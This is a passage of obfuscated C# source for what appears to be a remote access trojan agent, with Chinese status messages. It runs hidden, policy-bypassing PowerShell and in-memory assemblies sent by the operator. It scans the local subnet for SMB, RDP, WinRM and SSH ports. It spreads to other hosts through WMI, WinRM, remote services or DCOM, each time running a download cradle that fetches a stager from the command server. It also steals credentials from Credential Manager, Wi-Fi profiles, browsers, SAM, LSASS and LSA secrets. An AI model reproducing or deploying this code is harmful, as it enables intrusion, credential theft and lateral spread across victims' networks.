                (errMsg) =>
                {
                    agent._TfnfMjSzCWKv("screen_error", id, "\"" + _AexenijxeK(errMsg) + "\"");
                });

            if (_xotoYqccLlIugpV.TryAdd(id, session))
            {
                session.Start();
                _TfnfMjSzCWKv("screen_started", id, "{\"mode\":\"gdi\"}");
            }
        }

        void _OMzhIPyLcijnmGbS(string id)
        {
            _YztSpVugDPypw session;
            if (_xotoYqccLlIugpV.TryRemove(id, out session))
                session.Stop();
        }

        
        void _YwGwoHqoFzVys(string id, string payload)
        {
            var mode = _hUALleDbnckSq(payload, "mode");
            var code = _hUALleDbnckSq(payload, "code");
            int timeout = 30;
            var toStr = _hUALleDbnckSq(payload, "timeout");
            if (!string.IsNullOrEmpty(toStr)) int.TryParse(toStr, out timeout);
            if (timeout <= 0) timeout = 30;

            string output = "", error = "";
            try
            {
                string encodedCmd;
                switch (mode)
                {
                    case "ps1":
                        var scriptBytes = Convert.FromBase64String(code);
                        encodedCmd = Convert.ToBase64String(Encoding.Unicode.GetBytes(
                            Encoding.UTF8.GetString(scriptBytes)));
                        break;
                    case "dotnet":
                        var psScript = string.Format(
                            "$bytes = [Convert]::FromBase64String('{0}')\n" +
                            "$asm = [Reflection.Assembly]::Load($bytes)\n" +
                            "$entry = $asm.EntryPoint\n" +
                            "if ($entry) {{ $entry.Invoke($null, @(,@())) }}" +
                            " else {{ $types = $asm.GetExportedTypes(); foreach ($t in $types) {{ $main = $t.GetMethod('Run', [Reflection.BindingFlags]'Public,Static'); if ($main) {{ $main.Invoke($null, $null); break }} }} }}",
                            code);
                        encodedCmd = Convert.ToBase64String(Encoding.Unicode.GetBytes(psScript));
                        break;
                    default:
                        _TfnfMjSzCWKv("mem_exec_result", id, string.Format(
                            "{{\"output\":\"\",\"error\":\"{0}\"}}", _AexenijxeK("不支持的模式: " + mode)));
                        return;
                }

                var psi = new ProcessStartInfo(_Q._S("HJZQormOj2dPb59WCXQ="),
                    "-ep bypass -w hidden -NonI -EncodedCommand " + encodedCmd)
                {
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                };
                var proc = Process.Start(psi);
                output = proc.StandardOutput.ReadToEnd();
                var stderr = proc.StandardError.ReadToEnd();
                proc.WaitForExit(timeout * 1000);
                if (!string.IsNullOrEmpty(stderr)) error = stderr;
            }
            catch (Exception ex) { error = ex.Message; }

            _TfnfMjSzCWKv("mem_exec_result", id, string.Format(
                "{{\"output\":\"{0}\",\"error\":\"{1}\"}}",
                _AexenijxeK(output), _AexenijxeK(error)));
        }

        
        void _dnWmSCZfhqXHZ(string id, string payload)
        {
            try
            {
                
                string subnet = _hUALleDbnckSq(payload, "subnet"); 
                string portsStr = _hUALleDbnckSq(payload, "ports"); 
                int timeoutMs = 300;
                var toStr = _hUALleDbnckSq(payload, "timeout");
                if (!string.IsNullOrEmpty(toStr)) int.TryParse(toStr, out timeoutMs);
                if (timeoutMs <= 0 || timeoutMs > 5000) timeoutMs = 300;

                int[] ports = new int[] { 445, 135, 5985, 3389, 22 };
                if (!string.IsNullOrEmpty(portsStr))
                {
                    var parts = portsStr.Split(',');
                    var pList = new List<int>();
                    foreach (var p in parts)
                    {
                        int pv;
                        if (int.TryParse(p.Trim(), out pv) && pv > 0 && pv < 65536) pList.Add(pv);
                    }
                    if (pList.Count > 0) ports = pList.ToArray();
                }

                
                if (string.IsNullOrEmpty(subnet))
                {
                    foreach (var ni in System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces())
                    {
                        if (ni.OperationalStatus != System.Net.NetworkInformation.OperationalStatus.Up) continue;
                        if (ni.NetworkInterfaceType == System.Net.NetworkInformation.NetworkInterfaceType.Loopback) continue;
                        foreach (var addr in ni.GetIPProperties().UnicastAddresses)
                        {
                            if (addr.Address.AddressFamily != System.Net.Sockets.AddressFamily.InterNetwork) continue;
                            var ip = addr.Address.ToString();
                            if (ip.StartsWith("127.")) continue;
                            var segs = ip.Split('.');
                            if (segs.Length == 4) { subnet = segs[0] + "." + segs[1] + "." + segs[2]; break; }
                        }
                        if (!string.IsNullOrEmpty(subnet)) break;
                    }
                }
                if (string.IsNullOrEmpty(subnet)) { _TfnfMjSzCWKv("net_scan_result", id, "{\"error\":\"无法检测本机子网\",\"hosts\":[]}"); return; }

                
                var results = new System.Collections.Concurrent.ConcurrentBag<string>();
                var countdown = new CountdownEvent(254);
                string localIp = "";
                try
                {
                    var host = Dns.GetHostEntry(Dns.GetHostName());
                    foreach (var a in host.AddressList)
                        if (a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork && a.ToString().StartsWith(subnet + "."))
                        { localIp = a.ToString(); break; }
                }
                catch { }

                for (int i = 1; i <= 254; i++)
                {
                    string targetIp = subnet + "." + i;
                    if (targetIp == localIp) { countdown.Signal(); continue; }
                    ThreadPool.QueueUserWorkItem(_ =>
                    {
                        try
                        {
                            var openPorts = new List<int>();
                            foreach (int port in ports)
                            {
                                try
                                {
                                    using (var sock = new System.Net.Sockets.TcpClient())
                                    {
                                        var ar = sock.BeginConnect(targetIp, port, null, null);
                                        if (ar.AsyncWaitHandle.WaitOne(timeoutMs))
                                        {
                                            try { sock.EndConnect(ar); openPorts.Add(port); } catch { }
                                        }
                                    }
                                }
                                catch { }
                            }
                            if (openPorts.Count > 0)
                            {
                                string hostname = "";
                                try { hostname = Dns.GetHostEntry(targetIp).HostName; } catch { }
                                var sb = new StringBuilder();
                                sb.Append("{\"ip\":\""); sb.Append(_AexenijxeK(targetIp));
                                sb.Append("\",\"hostname\":\""); sb.Append(_AexenijxeK(hostname));
                                sb.Append("\",\"ports\":[");
                                for (int p = 0; p < openPorts.Count; p++)
                                {
                                    if (p > 0) sb.Append(",");
                                    sb.Append(openPorts[p]);
                                }
                                sb.Append("]}");
                                results.Add(sb.ToString());
                            }
                        }
                        catch { }
                        finally { countdown.Signal(); }
                    });
                }

                countdown.Wait(timeoutMs * ports.Length + 30000); 

                var hostList = new StringBuilder();
                hostList.Append("{\"subnet\":\""); hostList.Append(_AexenijxeK(subnet));
                hostList.Append("\",\"localIp\":\""); hostList.Append(_AexenijxeK(localIp));
                hostList.Append("\",\"hosts\":[");
                int idx = 0;
                foreach (var h in results)
                {
                    if (idx > 0) hostList.Append(",");
                    hostList.Append(h);
                    idx++;
                }
                hostList.Append("]}");
                _TfnfMjSzCWKv("net_scan_result", id, hostList.ToString());
            }
            catch (Exception ex)
            {
                _TfnfMjSzCWKv("net_scan_result", id, "{\"error\":\"" + _AexenijxeK(ex.Message) + "\",\"hosts\":[]}");
            }
        }

        
        void _jRzDfoNJNKDIljVdYcc(string id, string payload)
        {
            try
            {
                string targetIp = _hUALleDbnckSq(payload, "ip");
                string username = _hUALleDbnckSq(payload, "username");
                string password = _hUALleDbnckSq(payload, "password");
                string method = _hUALleDbnckSq(payload, "method"); 
                if (string.IsNullOrEmpty(method)) method = "wmi";

                if (string.IsNullOrEmpty(targetIp))
                {
                    _TfnfMjSzCWKv("lateral_deploy_result", id,
                        "{\"success\":false,\"error\":\"缺少 ip\"}");
                    return;
                }

                bool useCurrentCred = string.IsNullOrEmpty(username) || string.IsNullOrEmpty(password);

                
                string stagerUrl = _hXDJfNdoAJ.TrimEnd('/') + "/api/agent/stager?mid=" + Uri.EscapeDataString(targetIp);
                string cradle = string.Format(
                    "powershell.exe -ep bypass -w hidden -NonI -c \"[Net.ServicePointManager]::SecurityProtocol='Tls12';IEX((New-Object Net.WebClient).DownloadString('{0}'))\"",
                    stagerUrl);

                string error = "";
                bool success = false;

                if (method == "wmi")
                {
                    try
                    {
                        ManagementScope scope;
                        if (useCurrentCred)
                        {
                            
                            var connOpts = new ConnectionOptions();
                            connOpts.Impersonation = ImpersonationLevel.Impersonate;
                            connOpts.EnablePrivileges = true;
                            scope = new ManagementScope(@"\\" + targetIp + @"\root\cimv2", connOpts);
                        }
                        else
                        {
                            var connOpts = new ConnectionOptions();
                            connOpts.Username = username;
                            connOpts.Password = password;
                            connOpts.Impersonation = ImpersonationLevel.Impersonate;
                            connOpts.EnablePrivileges = true;
                            scope = new ManagementScope(@"\\" + targetIp + @"\root\cimv2", connOpts);
                        }
                        scope.Connect();

                        using (var processClass = new ManagementClass(scope, new ManagementPath("Win32_Process"), null))
                        {
                            var inParams = processClass.GetMethodParameters("Create");
                            inParams["CommandLine"] = cradle;
                            var outParams = processClass.InvokeMethod("Create", inParams, null);
                            int returnValue = Convert.ToInt32(outParams["ReturnValue"]);
                            int pid = Convert.ToInt32(outParams["ProcessId"]);
                            if (returnValue == 0)
                            {
                                success = true;
                                error = "PID=" + pid;
                            }
                            else
                            {
                                error = "Win32_Process.Create 返回 " + returnValue;
                            }
                        }
                    }
                    catch (Exception ex) { error = "WMI: " + ex.Message; }
                }
                else if (method == "winrm")
                {
                    
                    try
                    {
                        string iexCmd = "[Net.ServicePointManager]::SecurityProtocol='Tls12';IEX((New-Object Net.WebClient).DownloadString('" + stagerUrl + "'))";
                        string psScript;
                        if (useCurrentCred)
                        {
                            psScript = string.Format(
                                "Invoke-Command -ComputerName '{0}' -ScriptBlock {{ {1} }}",
                                targetIp, iexCmd);
                        }
                        else
                        {
                            psScript = string.Format(
                                "$pw = ConvertTo-SecureString '{0}' -AsPlainText -Force; " +
                                "$cred = New-Object System.Management.Automation.PSCredential('{1}', $pw); " +
                                "Invoke-Command -ComputerName '{2}' -Credential $cred -ScriptBlock {{ {3} }}",
                                password.Replace("'", "''"), username.Replace("'", "''"), targetIp, iexCmd);
                        }
                        string encoded = Convert.ToBase64String(Encoding.Unicode.GetBytes(psScript));
                        var psi = new ProcessStartInfo(_Q._S("HJZQormOj2dPb59WCXQ="), "-ep bypass -w hidden -NonI -EncodedCommand " + encoded)
                        {
                            UseShellExecute = false, RedirectStandardOutput = true, RedirectStandardError = true, CreateNoWindow = true
                        };
                        var proc = Process.Start(psi);
                        string stdout = proc.StandardOutput.ReadToEnd();
                        string stderr = proc.StandardError.ReadToEnd();
                        proc.WaitForExit(60000);
                        success = proc.ExitCode == 0;
                        error = success ? stdout : stderr;
                    }
                    catch (Exception ex) { error = "WinRM: " + ex.Message; }
                }
                else if (method == "psexec" || method == "smb")
                {
                    
                    try
                    {
                        
                        if (!useCurrentCred)
                        {
                            RunCmdQuiet("net", string.Format("use \\\\{0}\\IPC$ /user:{1} \"{2}\"",
                                targetIp, username, password), 10000);
                        }

                        
                        string svcName = "Svc" + Guid.NewGuid().ToString("N").Substring(0, 6);
                        string svcBinPath = "cmd.exe /c " + cradle;

                        
                        string createOut = RunCmdQuiet("sc.exe",
                            string.Format("\\\\{0} create {1} binPath= \"{2}\" start= demand type= own",
                                targetIp, svcName, svcBinPath), 15000);

                        if (createOut.Contains("SUCCESS") || createOut.Contains("[SC]"))
                        {
                            RunCmdQuiet("sc.exe",
                                string.Format("\\\\{0} start {1}", targetIp, svcName), 10000);
                            Thread.Sleep(2000);
                            
                            RunCmdQuiet("sc.exe",
                                string.Format("\\\\{0} delete {1}", targetIp, svcName), 10000);
                            success = true;
                            error = "svc=" + svcName;
                        }
                        else
                        {
                            error = "sc create: " + createOut;
                        }

                        
                        if (!useCurrentCred)
                            RunCmdQuiet("net", "use \\\\{0}\\IPC$ /delete /y".Replace("{0}", targetIp), 5000);
                    }
                    catch (Exception ex) { error = "PsExec: " + ex.Message; }
                }
                else if (method == "dcom")
                {
                    
                    try
                    {
                        Type comType = Type.GetTypeFromProgID("MMC20.Application", targetIp, true);
                        object mmc = Activator.CreateInstance(comType);
                        object doc = mmc.GetType().InvokeMember("Document", System.Reflection.BindingFlags.GetProperty, null, mmc, null);
                        object view = doc.GetType().InvokeMember("ActiveView", System.Reflection.BindingFlags.GetProperty, null, doc, null);
                        view.GetType().InvokeMember("ExecuteShellCommand",
                            System.Reflection.BindingFlags.InvokeMethod, null, view,
                            new object[] { _Q._S("HJZQormOj2dPb59WCXQ="),
                                null,
                                "-ep bypass -w hidden -NonI -c \"[Net.ServicePointManager]::SecurityProtocol='Tls12';IEX((New-Object Net.WebClient).DownloadString('" + stagerUrl + "'))\"",
                                "7" });
                        success = true;
                        error = "DCOM MMC20 OK";
                        try { Marshal.ReleaseComObject(mmc); } catch { }
                    }
                    catch (Exception ex) { error = "DCOM: " + ex.Message; }
                }
                else
                {
                    error = "不支持的方法: " + method + " (支持: wmi/winrm/psexec/dcom)";
                }

                _TfnfMjSzCWKv("lateral_deploy_result", id, string.Format(
                    "{{\"success\":{0},\"ip\":\"{1}\",\"method\":\"{2}\",\"error\":\"{3}\"}}",
                    success ? "true" : "false", _AexenijxeK(targetIp), _AexenijxeK(method), _AexenijxeK(error)));
            }
            catch (Exception ex)
            {
                _TfnfMjSzCWKv("lateral_deploy_result", id,
                    "{\"success\":false,\"error\":\"" + _AexenijxeK(ex.Message) + "\"}");
            }
        }

        
        
        

        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr hObject);
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CredEnumerateW(string filter, int flags, out int count, out IntPtr credentialPtr);
        [DllImport("advapi32.dll")]
        static extern void CredFree(IntPtr buffer);
        [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CryptUnprotectData(IntPtr pDataIn, IntPtr ppszDataDescr, IntPtr pOptionalEntropy, IntPtr pvReserved, IntPtr pPromptStruct, int dwFlags, IntPtr pDataOut);
        [DllImport("kernel32.dll")]
        static extern IntPtr LocalFree(IntPtr hMem);
        [DllImport("dbghelp.dll", SetLastError = true)]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, int processId, IntPtr hFile, int dumpType, IntPtr exceptionParam, IntPtr userStreamParam, IntPtr callbackParam);
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary(string lpFileName);
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern int RegSaveKeyW(IntPtr hKey, string lpFile, IntPtr lpSecurityAttributes);
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern int RegOpenKeyExW(IntPtr hKey, string lpSubKey, int ulOptions, int samDesired, out IntPtr phkResult);
        [DllImport("advapi32.dll")]
        static extern int RegCloseKey(IntPtr hKey);
        
        [DllImport("bcrypt.dll")]
        static extern int BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId, [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation, int dwFlags);
        [DllImport("bcrypt.dll")]
        static extern int BCryptSetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, int dwFlags);
        [DllImport("bcrypt.dll")]
        static extern int BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbSecret, int cbSecret, int dwFlags);
        [DllImport("bcrypt.dll")]
        static extern int BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, IntPtr pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, out int pcbResult, int dwFlags);
        [DllImport("bcrypt.dll")]
        static extern int BCryptDestroyKey(IntPtr hKey);
        [DllImport("bcrypt.dll")]
        static extern int BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, int dwFlags);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenProcessToken(IntPtr processHandle, int desiredAccess, out IntPtr tokenHandle);
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool LookupPrivilegeValueW(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool AdjustTokenPrivileges(IntPtr tokenHandle, bool disableAllPrivileges, IntPtr newState, int bufferLength, IntPtr previousState, IntPtr returnLength);

        
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern int LsaOpenPolicy(IntPtr systemName, IntPtr objectAttributes, int desiredAccess, out IntPtr policyHandle);
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern int LsaRetrievePrivateData(IntPtr policyHandle, IntPtr keyName, out IntPtr privateData);
        [DllImport("advapi32.dll")]
        static extern int LsaClose(IntPtr objectHandle);
        [DllImport("advapi32.dll")]
        static extern int LsaFreeMemory(IntPtr buffer);
        [DllImport("advapi32.dll")]
        static extern int LsaNtStatusToWinError(int status);
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern int RegEnumKeyExW(IntPtr hKey, int dwIndex, StringBuilder lpName, ref int lpcchName, IntPtr lpReserved, IntPtr lpClass, IntPtr lpcchClass, IntPtr lpftLastWriteTime);

        void _fSshpcIDbaxmHgw(string privilege)
        {
            IntPtr hToken;
            OpenProcessToken(Process.GetCurrentProcess().Handle, 0x0020 | 0x0008, out hToken);
            long luid;
            LookupPrivilegeValueW(null, privilege, out luid);
            
            byte[] tp = new byte[16];
            BitConverter.GetBytes(1).CopyTo(tp, 0); 
            BitConverter.GetBytes(luid).CopyTo(tp, 4); 
            BitConverter.GetBytes(0x00000002).CopyTo(tp, 12); 
            IntPtr tpPtr = Marshal.AllocHGlobal(16);
            Marshal.Copy(tp, 0, tpPtr, 16);
            AdjustTokenPrivileges(hToken, false, tpPtr, 0, IntPtr.Zero, IntPtr.Zero);
            Marshal.FreeHGlobal(tpPtr);
            CloseHandle(hToken);
        }

        
        bool RunCredSection(StringBuilder results, bool first, string name, int timeoutSec, Func<StringBuilder, bool, bool> func)
        {
            var sb = new StringBuilder();
            Exception taskEx = null;
            try
            {
                var t = new Thread(() => { try { func(sb, true); } catch (Exception ex) { taskEx = ex; } });
                t.IsBackground = true;
                t.Start();
                if (!t.Join(timeoutSec * 1000))
                {
                    if (!first) results.Append(",");
                    results.Append("{\"source\":\"" + name + "-timeout\",\"username\":\"\",\"password\":\"超时" + timeoutSec + "秒\",\"target\":\"\",\"type\":9}");
                    return false;
                }
                if (taskEx != null)
                {
                    if (!first) results.Append(",");
                    results.Append("{\"source\":\"" + name + "-error\",\"username\":\"\",\"password\":\"" + _AexenijxeK(taskEx.GetType().Name + ": " + taskEx.Message) + "\",\"target\":\"\",\"type\":9}");
                    return false;
                }
                if (sb.Length > 0)
                {
                    if (!first) results.Append(",");
                    results.Append(sb.ToString());
                    return false;
                }
                return first;
            }
            catch (Exception ex)
            {
                if (!first) results.Append(",");
                results.Append("{\"source\":\"" + name + "-error\",\"username\":\"\",\"password\":\"" + _AexenijxeK(ex.GetType().Name + ": " + ex.Message) + "\",\"target\":\"\",\"type\":9}");
                return false;
            }
        }

        [System.Runtime.ExceptionServices.HandleProcessCorruptedStateExceptions]
        [System.Security.SecurityCritical]
        void _qdAiUoEObwHHaU(string id, string payload)
        {
            try
            {
                string method = _hUALleDbnckSq(payload, "method"); 
                if (string.IsNullOrEmpty(method)) method = "all";

                var results = new StringBuilder();
                results.Append("{\"credentials\":[");
                bool first = true;
                results.Append("{\"source\":\"dll-ver\",\"target\":\"\",\"username\":\"\",\"password\":\"v20260501c\",\"type\":9}");
                first = false;

                if (method == "all" || method == "credman")
                    first = RunCredSection(results, first, "credman", 15, (sb, f) => _MmBnBpLjjDEUONPjIfWRi(sb, f));
                if (method == "all" || method == "wifi")
                    first = RunCredSection(results, first, "wifi", 15, (sb, f) => _VueCfeJFDzMVmeOsN(sb, f));
                if (method == "all" || method == "browser")
                {
                    first = RunCredSection(results, first, "browser", 30, (sb, f) => _yAZNPAEVhCtnyjZV(sb, f));
                    first = RunCredSection(results, first, "firefox", 15, (sb, f) => DumpFirefoxPasswords(sb, f));
                }
                

                results.Append("],");

                
                string samInfo = "";
                string lsassInfo = "";
                string lsaInfo = "";
                if (method == "sam")
                {
                    try { samInfo = _TuCiMNCIQDsxU(); } catch (Exception ex) { samInfo = "SAM error: " + ex.Message; }
                }
                if (method == "lsass")
                {
                    try { lsassInfo = _rRnfJpAFw(); } catch (Exception ex) { lsassInfo = "LSASS error: " + ex.Message; }
                }
                if (method == "lsa")
                {
                    try { lsaInfo = DumpLsaSecrets(); } catch (Exception ex) { lsaInfo = "LSA error: " + ex.Message; }
                }

                results.Append("\"sam\":\"" + _AexenijxeK(samInfo) + "\",");
                results.Append("\"lsass\":\"" + _AexenijxeK(lsassInfo) + "\",");
                results.Append("\"lsa\":\"" + _AexenijxeK(lsaInfo) + "\"}");

                _TfnfMjSzCWKv("cred_dump_result", id, results.ToString());
            }
            catch (Exception ex)
            {
                
                try
                {
                    _TfnfMjSzCWKv("cred_dump_result", id,
                        "{\"credentials\":[{\"source\":\"fatal-error\",\"username\":\"\",\"password\":\"" + _AexenijxeK(ex.Message) + "\",\"target\":\"\"}],\"sam\":\"\",\"lsass\":\"\",\"lsa\":\"\"}");
                }
                catch { }
            }
        }

        
        [System.Runtime.ExceptionServices.HandleProcessCorruptedStateExceptions]
        [System.Security.SecurityCritical]
        void HandleChatDump(string id, string payload)
        {
            try
            {
                var results = new StringBuilder();
                results.Append("{\"credentials\":[");
                bool first = true;
                results.Append("{\"source\":\"info\",\"target\":\"\",\"username\":\"\",\"password\":\"功能已移除\",\"type\":9}");
                results.Append("]}");
                _TfnfMjSzCWKv("chat_dump_result", id, results.ToString());
            }
            catch (Exception ex)
            {
                try
                {
                    _TfnfMjSzCWKv("chat_dump_result", id,
                        "{\"credentials\":[{\"source\":\"fatal-error\",\"username\":\"\",\"password\":\"" + _AexenijxeK(ex.Message) + "\",\"target\":\"\",\"type\":9}]}");
                }
                catch { }
            }
        }

        
        [System.Runtime.ExceptionServices.HandleProcessCorruptedStateExceptions]
        [System.Security.SecurityCritical]
        bool _MmBnBpLjjDEUONPjIfWRi(StringBuilder sb, bool first)
        {
            int count;
            IntPtr credPtr;
            if (!CredEnumerateW(null, 0, out count, out credPtr))
                return first;

            
            
            
            int p = IntPtr.Size;
            int offType = 4;
            int offTarget = 8;
            int offBlobSize = (p == 8) ? 32 : 24;
            int offBlob    = (p == 8) ? 40 : 28;
            int offUser    = (p == 8) ? 80 : 48;

            for (int i = 0; i < count; i++)
            {
                try
                {
                    IntPtr credEntry = Marshal.ReadIntPtr(credPtr, i * p);
                    if (credEntry == IntPtr.Zero) continue;

                    int credType = Marshal.ReadInt32(credEntry, offType);

                    IntPtr targetPtr = Marshal.ReadIntPtr(credEntry, offTarget);
                    string target = (targetPtr != IntPtr.Zero) ? Marshal.PtrToStringUni(targetPtr) : "";

                    int blobSize = Marshal.ReadInt32(credEntry, offBlobSize);
                    IntPtr blobPtr = Marshal.ReadIntPtr(credEntry, offBlob);

                    IntPtr userPtr = Marshal.ReadIntPtr(credEntry, offUser);
                    string username = (userPtr != IntPtr.Zero) ? Marshal.PtrToStringUni(userPtr) : "";

                    string password = "";
                    if (blobSize > 0 && blobSize < 10240 && blobPtr != IntPtr.Zero)
                    {
                        byte[] blob = new byte[blobSize];
                        Marshal.Copy(blobPtr, blob, 0, blobSize);
                        if (credType == 2 || credType == 4)
                        {
                            password = Encoding.Unicode.GetString(blob).TrimEnd('\0');
                        }
                        else
                        {
                            bool printable = blobSize >= 2 && blobSize % 2 == 0;
                            if (printable)
                            {
                                string attempt = Encoding.Unicode.GetString(blob).TrimEnd('\0');
                                foreach (char ch in attempt)
                                {
                                    if (ch != '\t' && ch != '\n' && ch != '\r' && (ch < ' ' || (ch > '~' && ch < 0x4E00)))
                                    { printable = false; break; }
                                }
                                if (printable) password = attempt;
                            }
                            if (!printable) password = "[base64]" + Convert.ToBase64String(blob);
                        }
                    }

                    if (!string.IsNullOrEmpty(username) || !string.IsNullOrEmpty(password))
                    {
                        if (!first) sb.Append(",");
                        first = false;
                        sb.Append(string.Format("{{\"source\":\"credman\",\"target\":\"{0}\",\"username\":\"{1}\",\"password\":\"{2}\",\"type\":{3}}}",
                            _AexenijxeK(target ?? ""), _AexenijxeK(username ?? ""), _AexenijxeK(password ?? ""), credType));
                    }
                }
                catch { }
            }
            CredFree(credPtr);
            return first;
        }

        
        bool _VueCfeJFDzMVmeOsN(StringBuilder sb, bool first)
        {
            
            bool apiWorked = false;
            try { apiWorked = DumpWiFiNativeApi(sb, ref first); } catch { }

            
            if (!apiWorked)
            {
                try { DumpWiFiNetsh(sb, ref first); } catch { }
            }
            return first;
        }

        bool DumpWiFiNativeApi(StringBuilder sb, ref bool first)
        {
            IntPtr hClient = IntPtr.Zero;
            IntPtr pIfList = IntPtr.Zero;
            uint ver;
            if (WlanOpenHandle(2, IntPtr.Zero, out ver, out hClient) != 0) return false;
            try
            {
                if (WlanEnumInterfaces(hClient, IntPtr.Zero, out pIfList) != 0) return false;
                int ifCount = Marshal.ReadInt32(pIfList, 0); 
                if (ifCount == 0) return false;
                
                
                int entryOffset = 8;
                const int WLAN_INTERFACE_INFO_SIZE = 532;
                bool gotAny = false;

                for (int i = 0; i < ifCount; i++)
                {
                    IntPtr ifEntry = new IntPtr(pIfList.ToInt64() + entryOffset + i * WLAN_INTERFACE_INFO_SIZE);
                    byte[] guidBytes = new byte[16];
                    Marshal.Copy(ifEntry, guidBytes, 0, 16);
                    Guid ifGuid = new Guid(guidBytes);

                    IntPtr pProfileList = IntPtr.Zero;
                    if (WlanGetProfileList(hClient, ref ifGuid, IntPtr.Zero, out pProfileList) != 0) continue;
                    try
                    {
                        int profCount = Marshal.ReadInt32(pProfileList, 0);
                        
                        
                        int profOffset = 8;
                        const int WLAN_PROFILE_INFO_SIZE = 520;

                        for (int j = 0; j < profCount; j++)
                        {
                            try
                            {
                                IntPtr profEntry = new IntPtr(pProfileList.ToInt64() + profOffset + j * WLAN_PROFILE_INFO_SIZE);
                                string profName = Marshal.PtrToStringUni(profEntry);
                                if (string.IsNullOrEmpty(profName)) continue;

                                string password = "";
                                IntPtr pXml = IntPtr.Zero;
                                uint flags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
                                uint access;
                                if (WlanGetProfile(hClient, ref ifGuid, profName, IntPtr.Zero, out pXml, ref flags, out access) == 0 && pXml != IntPtr.Zero)
                                {
                                    try
                                    {
                                        string xml = Marshal.PtrToStringUni(pXml);
                                        
                                        if (xml != null)
                                        {
                                            int ks = xml.IndexOf("<keyMaterial>");
                                            if (ks >= 0)
                                            {
                                                ks += 13; 
                                                int ke = xml.IndexOf("</keyMaterial>", ks);
                                                if (ke > ks) password = xml.Substring(ks, ke - ks);
                                            }
                                        }
                                    }
                                    finally { WlanFreeMemory(pXml); }
                                }

                                if (!first) sb.Append(",");
                                first = false;
                                sb.Append(string.Format("{{\"source\":\"wifi\",\"target\":\"{0}\",\"username\":\"\",\"password\":\"{1}\",\"type\":0}}",
                                    _AexenijxeK(profName), _AexenijxeK(password)));
                                gotAny = true;
                            }
                            catch { }
                        }
                    }
                    finally { WlanFreeMemory(pProfileList); }
                }
                return gotAny;
            }
            finally
            {
                if (pIfList != IntPtr.Zero) WlanFreeMemory(pIfList);
                WlanCloseHandle(hClient, IntPtr.Zero);
            }
        }

        void DumpWiFiNetsh(StringBuilder sb, ref bool first)
        {
            var psi = new ProcessStartInfo(_Q._S("D5RD6a6Fgg=="), "/c chcp 65001 >nul & netsh wlan show profiles")
            {
                UseShellExecute = false, RedirectStandardOutput = true, CreateNoWindow = true,
                StandardOutputEncoding = Encoding.UTF8
            };
            var proc = Process.Start(psi);
            string output = proc.StandardOutput.ReadToEnd();
            proc.WaitForExit(10000);

            foreach (string line in output.Split('\n'))
            {
                string trimmed = line.Trim();
                int idx = trimmed.IndexOf(':');
                if (idx < 0) continue;
                string prefix = trimmed.Substring(0, idx).ToLower();
                if (!prefix.Contains("profile") && !prefix.Contains("配置文件")) continue;
                string profileName = trimmed.Substring(idx + 1).Trim();
                if (string.IsNullOrEmpty(profileName)) continue;

                try
                {
                    var psi2 = new ProcessStartInfo(_Q._S("D5RD6a6Fgg=="), "/c chcp 65001 >nul & netsh wlan show profile name=\"" + profileName + "\" key=clear")
                    {
                        UseShellExecute = false, RedirectStandardOutput = true, CreateNoWindow = true,
                        StandardOutputEncoding = Encoding.UTF8
                    };
                    var proc2 = Process.Start(psi2);
                    string detail = proc2.StandardOutput.ReadToEnd();
                    proc2.WaitForExit(5000);

                    string password = "";
                    foreach (string dline in detail.Split('\n'))
                    {
                        string dt = dline.Trim().ToLower();
                        if (dt.Contains("key content") || dt.Contains("关键内容"))
                        {
                            int ci = dline.IndexOf(':');
                            if (ci >= 0) password = dline.Substring(ci + 1).Trim();
                        }
                    }

                    if (!first) sb.Append(",");
                    first = false;
                    sb.Append(string.Format("{{\"source\":\"wifi\",\"target\":\"{0}\",\"username\":\"\",\"password\":\"{1}\",\"type\":0}}",
                        _AexenijxeK(profileName), _AexenijxeK(password)));
                }
                catch { }
            }
        }

        
        [System.Runtime.ExceptionServices.HandleProcessCorruptedStateExceptions]
        [System.Security.SecurityCritical]
        bool _yAZNPAEVhCtnyjZV(StringBuilder sb, bool first)
        {
            string origUser = Environment.UserName;
            bool impersonated = false;
            IntPtr userToken = IntPtr.Zero;

            
            bool isSystem = origUser.ToUpperInvariant() == "SYSTEM" ||
                            origUser.EndsWith("$") ||
                            origUser.ToUpperInvariant().Contains("SERVICE");

            
            if (isSystem)
            {
                try
                {
                    uint consoleSid = WTSGetActiveConsoleSessionId();
                    if (consoleSid != 0 && consoleSid != 0xFFFFFFFF)
                    {
                        if (WTSQueryUserToken(consoleSid, out userToken))
                        {
                            impersonated = ImpersonateLoggedOnUser(userToken);
                        }
                    }
                }
                catch { }
            }

            try
            {
            
            string localApp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
